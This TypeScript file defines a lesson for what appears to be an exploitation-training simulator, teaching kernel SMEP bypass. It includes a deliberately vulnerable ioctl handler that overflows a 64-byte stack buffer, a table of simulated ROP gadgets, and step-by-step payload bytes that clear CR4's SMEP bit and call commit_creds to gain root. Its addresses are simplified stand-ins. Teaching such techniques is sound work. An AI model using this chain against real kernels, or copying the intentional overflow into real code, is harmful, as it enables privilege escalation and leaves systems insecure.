import { Exercise } from '../types';

const kern106: Exercise = {
  id: 'kern-106',
  unitId: 'unit18-kernel',
  title: '106: SMEP/SMAP Bypass',
  desc: '<b>Goal:</b> Understand how <strong>SMEP</strong> (Supervisor Mode Execution Prevention) blocks jumping to user-space shellcode from ring 0, and how attackers bypass it with <strong>kernel ROP</strong>. Step through an overflow that hits SMEP, then see how a ROP chain using only kernel gadgets can disable SMEP by flipping the CR4 register or directly call commit_creds.',
  source: {
    c: [
      { text: '#include <linux/module.h>', cls: '' },
      { text: '#include <linux/uaccess.h>', cls: '' },
      { text: '', cls: '' },
      { text: '// CR4 register controls SMEP/SMAP:', cls: 'cmt' },
      { text: '// Bit 20 = SMEP (exec protection)', cls: 'cmt' },
      { text: '// Bit 21 = SMAP (read/write protection)', cls: 'cmt' },
      { text: '', cls: '' },
      { text: 'static long vuln_ioctl(struct file *f,', cls: '', fn: true },
      { text: '    unsigned int cmd, unsigned long arg) {', cls: '' },
      { text: '    char kbuf[64];', cls: 'highlight' },
      { text: '    copy_from_user(kbuf, (void*)arg, 256);', cls: 'highlight vuln' },
      { text: '    return 0;', cls: '' },
      { text: '}', cls: '' },
      { text: '', cls: '' },
      { text: '// Kernel .text gadgets:', cls: 'cmt' },
      { text: '// 0xc0101234: pop rdi; ret', cls: 'cmt highlight' },
      { text: '// 0xc0105678: mov cr4, rdi; ret', cls: 'cmt highlight' },
      { text: '// 0xc00a0000: commit_creds', cls: 'cmt highlight' },
      { text: '// 0xc00a0100: prepare_kernel_cred', cls: 'cmt highlight' },
    ],
  },
  mode: 'step',
  vizMode: 'stack',
  bufSize: 64,
  canary: false,
  aslr: false,
  showSymbols: true,
  showGadgetTable: true,
  gadgets: {
    0xc0101234: 'pop rdi; ret',
    0xc0105678: 'mov cr4, rdi; ret',
    0xc00a0000: 'commit_creds',
    0xc00a0100: 'prepare_kernel_cred',
  },
  protections: [
    { name: 'SMEP', status: 'active' },
    { name: 'SMAP', status: 'disabled' },
    { name: 'KASLR', status: 'disabled' },
    { name: 'Stack Canary', status: 'disabled' },
  ],
  steps: [
    {
      action: 'init',
      log: ['info', 'The vulnerable ioctl handler has a 64-byte kernel stack buffer. copy_from_user copies 256 bytes of user-controlled data, causing a kernel stack overflow. Without SMEP, we could just overwrite the return address with our user-space shellcode address.'],
      vizAction: (sim: any) => {
        if (!sim) return;
        sim.clearBlank();
        sim.clearHighlight();
        // Show the initial kernel stack layout
        sim._writeLE(0, 0x00000000, 4); // buffer area
        sim._writeLE(sim.bufSize, 0xc0200000, 4); // saved RBP (kernel addr)
        sim._writeLE(sim.bufSize + 4, 0xc0100000, 4); // return addr (kernel .text)
        sim.markRegion(0, sim.bufSize);
      },
    },
    {
      action: 'init',
      log: ['warn', 'Attempt 1: Overwrite return address with user-space shellcode at 0x08048000. SMEP FAULT! CR4 bit 20 is set, so the CPU refuses to execute code at a user-space address while in ring 0. The kernel panics with "unable to execute userspace code (SMEP)".'],
      vizAction: (sim: any) => {
        if (!sim) return;
        sim.clearHighlight();
        // Show the overflow with user-space address
        const payload = new Array(64).fill(0x41);
        sim.writeInput([...payload, 0xBB, 0xBB, 0xBB, 0xBB, 0x00, 0x80, 0x04, 0x08]);
        sim.markRegion(sim.bufSize + 4, sim.bufSize + 8); // highlight return addr
      },
    },
    {
      action: 'init',
      log: ['action', 'Bypass strategy: Use a kernel ROP chain. All gadgets must be in kernel .text (above 0xc0000000). First gadget: "pop rdi; ret" at 0xc0101234 loads a CR4 value with the SMEP bit cleared into RDI.'],
      vizAction: (sim: any) => {
        if (!sim) return;
        sim.clearHighlight();
        // ROP chain step 1: pop rdi; ret
        const payload = new Array(64).fill(0x41);
        // saved RBP (junk)
        payload.push(0xBB, 0xBB, 0xBB, 0xBB);
        // return addr -> pop rdi; ret gadget
        payload.push(0x34, 0x12, 0x10, 0xc0);
        sim.writeInput(payload);
        sim.markRegion(sim.bufSize + 4, sim.bufSize + 8);
      },
    },
    {
      action: 'init',
      log: ['action', 'ROP chain continues: After "pop rdi", the value 0x000406f0 (CR4 with SMEP bit 20 cleared) is loaded into RDI. Next gadget: "mov cr4, rdi; ret" at 0xc0105678 writes the new value to CR4, disabling SMEP.'],
      vizAction: (sim: any) => {
        if (!sim) return;
        sim.clearHighlight();
        // Show full ROP chain in stack
        const payload = new Array(64).fill(0x41);
        // saved RBP
        payload.push(0xBB, 0xBB, 0xBB, 0xBB);
        // gadget 1: pop rdi; ret
        payload.push(0x34, 0x12, 0x10, 0xc0);
        // CR4 value with SMEP cleared
        payload.push(0xf0, 0x06, 0x04, 0x00);
        // gadget 2: mov cr4, rdi; ret
        payload.push(0x78, 0x56, 0x10, 0xc0);
        sim.writeInput(payload);
        sim.markRegion(sim.bufSize + 8, sim.bufSize + 16); // highlight chain
      },
    },
    {
      action: 'init',
      log: ['action', 'With SMEP disabled, the ROP chain can now return to commit_creds(prepare_kernel_cred(0)) in kernel .text, or jump to user-space shellcode. Either way, the attacker gains root. Modern kernels pin CR4 and use KPTI, making this harder.'],
      vizAction: (sim: any) => {
        if (!sim) return;
        sim.clearHighlight();
        // Show final state with commit_creds target
        const payload = new Array(64).fill(0x41);
        payload.push(0xBB, 0xBB, 0xBB, 0xBB);  // saved RBP
        payload.push(0x34, 0x12, 0x10, 0xc0);  // pop rdi; ret
        payload.push(0xf0, 0x06, 0x04, 0x00);  // CR4 value
        payload.push(0x78, 0x56, 0x10, 0xc0);  // mov cr4, rdi; ret
        payload.push(0x00, 0x00, 0x0a, 0xc0);  // commit_creds
        sim.writeInput(payload);
        sim.markRegion(sim.bufSize + 16, sim.bufSize + 20); // highlight commit_creds
      },
    },
    {
      action: 'done',
      log: ['success', 'SMEP bypass summary: (1) Overflow kernel stack buffer. (2) SMEP blocks user-space code execution. (3) Build ROP chain using only kernel .text gadgets. (4) Flip CR4 bit 20 to disable SMEP, or call commit_creds directly. (5) Gain root. Modern mitigations: CR4 pinning, KPTI, FG-KASLR, CFI.'],
    },
  ],
  check() { return false; },
  winTitle: 'SMEP Bypass Complete!',
  winMsg: 'You learned how SMEP prevents executing user-space code from kernel mode, and how kernel ROP chains bypass it by using only kernel .text gadgets to manipulate CR4 or directly call credential functions.',
};

export default kern106;
